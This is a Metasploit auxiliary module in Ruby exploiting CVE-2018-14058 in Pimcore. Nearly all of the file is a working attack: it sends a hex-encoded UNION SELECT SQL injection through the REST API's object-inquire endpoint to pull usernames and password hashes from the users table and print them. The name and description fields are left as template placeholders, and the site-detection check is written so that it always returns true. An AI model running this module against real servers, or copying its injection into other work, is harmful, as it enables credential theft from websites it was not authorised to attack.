##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Module name',
      'Description'    => %q{
        Say something that the user might want to know.
      },
      'Author'         => [ 'Thongchai Silpavarangkura', # PoC
                            'N. Rai-Ngoen',              # PoC
                            'Shelby Pace'                # Metasploit Module
                          ],
      'License'        => MSF_LICENSE,
      'References'     => [
                            [ 'CVE', '2018-14058' ],
                            [ 'EDB', '45208']
                          ],
      'DisclosureDate' => 'Aug 13, 2018'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to pimcore', '/' ]),
        OptString.new('APIKEY', [ true, 'The valid API key for Pimcore REST API', '77369eee2b728e0efbb2c296549aea09b91d3751c26a3c27ce0b1dbb6bfaf11b' ])
      ])
  end

  def available?
    res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  normalize_uri(target_uri.path)
    )

    false unless res && res.body.include?('pimcore')

    true
  end

  def get_creds
    api_uri = "/webservice/rest/object-inquire?apikey=#{datastore['APIKEY']}&id="
    api_uri = normalize_uri(target_uri.path, api_uri)
    cmd = '1) UNION ALL SELECT CONCAT(name," ",password) from users#'
    cmd = Rex::Text.uri_encode(cmd, 'hex-all')

    res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  api_uri << cmd
    )

    unless res and res.body.include?('"success":true')
      fail_with(Failure::NotFound, 'The request returned no results.')
    end

    format_results(res.get_json_document['data'])
  end

  def format_results(response)
    fail_with(Failure::NotFound, 'No data found') unless response
    creds = response.to_s.scan(/"([^\s]*)\s(\$[^(=>)]*)"/)
    creds.each { |user, pass| print_good("#{user} : #{pass}") }
  end

  def run
    fail_with(Failure::NotFound, 'Could not access the Pimcore web page.') unless available?

    get_creds
  end
end
